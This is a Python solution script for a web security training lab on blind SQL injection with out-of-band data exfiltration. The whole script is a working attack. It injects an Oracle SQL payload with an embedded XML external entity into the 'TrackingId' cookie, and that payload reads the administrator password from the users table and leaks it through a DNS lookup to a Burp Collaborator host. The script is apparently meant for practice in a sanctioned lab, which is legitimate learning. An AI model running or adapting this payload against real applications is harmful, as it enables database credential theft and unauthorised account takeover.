#############################################################################
#
# Lab: Blind SQL injection with out-of-band data exfiltration
#
# Hack Steps:
#      1. Inject payload into 'TrackingId' cookie to extract administrator
#         password via DNS lookup
#      2. Get the administrator password from your burp collaborator
#      3. Login as administrator
#
#############################################################################
import requests
from colorama import Fore

# Change this to your lab URL
LAB_URL = "https://0a1e007704219c7f8890d02c00d90073.web-security-academy.net"

# Change this to your burp collaborator
BURP_COLLABORATOR = "kuibg0a5xv3ir219zv3d4mpzfqlh97xw.oastify.com"

def main():
    print("⦗#⦘ Injection point: " + Fore.YELLOW + "TrackingId")
    print(Fore.WHITE + "❯❯ Injecting payload to extract administrator password via DNS lookup.. ", end="", flush=True)

    payload = f"'||(SELECT EXTRACTVALUE(xmltype('<?xml version=\"1.0\" encoding=\"UTF-8\"?><!DOCTYPE root [ <!ENTITY %25 remote SYSTEM \"http://'||(select password from users where username = 'administrator')||'.f{BURP_COLLABORATOR}/\"> %25remote%3b]>'),'/l') FROM dual)-- -"
    cookies = { "TrackingId": payload }

    try:  
       requests.get(f"{LAB_URL}/filter?category=Pets", cookies=cookies)
        
    except:
        print(Fore.RED + "⦗!⦘ Failed to fetch the page with the injected payload through exception")
        exit(1)

    print(Fore.GREEN + "OK")
    print(Fore.WHITE + "🗹 Check your burp collaborator for the administrator password then login")

if __name__ == "__main__":
    main()
